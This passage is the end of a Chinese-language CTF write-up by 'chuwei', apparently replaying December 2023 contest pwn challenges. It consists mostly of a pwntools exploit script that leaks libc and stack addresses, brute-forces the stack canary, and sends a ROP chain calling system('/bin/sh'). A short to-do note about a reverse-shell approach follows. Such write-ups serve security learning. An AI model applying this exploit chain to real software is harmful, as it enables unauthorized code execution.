edit(0, 0x130+8, p32(0x444)+b"\n")

edit(0, 0, cyclic(544) + p64(0x406429+0x18)[:6]+b"\n")
show(6)
p.recvuntil(b'Data: ')
libc_base=uu64()-libc.sym['close']
lg("libc_base")

environ=libc_base+libc.sym['_environ']

edit(0, 0x130, p64(environ+1)+b"\n")
edit(0, 0x130+8, p32(0x444)+b"\n")

show(6)
stack_base=uu64()
lg("stack_base")
canary_addr=stack_base-0x78
lg("canary_addr")
i=-10
while True:
    edit(0, 0x130, p64(canary_addr+1+i*8)+b"\n")
    i=i+1
    edit(0, 0x130+8, p32(0x444)+b"\n")
    show(6)
    ru("Data: ")
    result=ru("\n")[:-1]
    if len(result)==8:
        break
canary=u64(result[:7].rjust(8,b"\x00"))
lg("canary")
#mydbg()
pop_rdi=0x0000000000027765+libc_base
binsh=libc_base+next(libc.search(b"/bin/sh"))
sys_addr=libc_base+libc.sym['system']
ret_addr=0x00000000000270e2 +libc_base
payload=b'\x00'*0x208+p64(canary)*3+p64(0)+p64(ret_addr)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)+b"\n"
edit(0,0,payload)
p.interactive()
```

#### 待做

**Spirit战队**wp中采用了反弹shell 的做法，这里我还不太了解，后续再学习吧。https://mp.weixin.qq.com/s/PtM7i5bPU2I7h3wZ328JQQ 

---

> 作者: chuwei  
> URL: https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/  

